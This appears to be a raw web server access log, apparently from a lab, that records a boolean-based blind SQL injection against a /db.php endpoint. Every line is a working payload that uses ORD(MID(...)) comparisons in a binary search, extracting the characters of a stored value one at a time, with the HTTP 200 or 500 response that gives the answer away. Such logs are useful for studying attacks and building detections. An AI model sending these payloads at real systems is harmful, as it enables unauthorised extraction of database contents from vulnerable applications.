500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),51,1))>102 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),51,1))>101 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),52,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),52,1))>112 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),52,1))>104 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),52,1))>100 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),52,1))>98 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),52,1))>97 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),53,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),53,1))>48 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),53,1))>72 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),53,1))>84 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),53,1))>90 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),53,1))>93 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),53,1))>94 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),53,1))>95 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),54,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),54,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),54,1))>80 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),54,1))>72 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),54,1))>68 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),54,1))>66 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),54,1))>65 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),55,1))>64 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),55,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),55,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),55,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),55,1))>108 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),55,1))>110 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),55,1))>111 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),56,1))>96 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),56,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),56,1))>104 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),56,1))>108 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),56,1))>110 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),56,1))>111 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),57,1))>96 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),57,1))>112 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),57,1))>120 HTTP/1.1
200 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),57,1))>124 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),57,1))>126 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),57,1))>125 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),58,1))>64 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),58,1))>32 HTTP/1.1
500 - GET /db.php?id=1 AND ORD(MID((SELECT IFNULL(CAST(val AS CHAR),0x20) FROM sqlinj.sqlinj ORDER BY id LIMIT 0,1),58,1))>1 HTTP/1.1
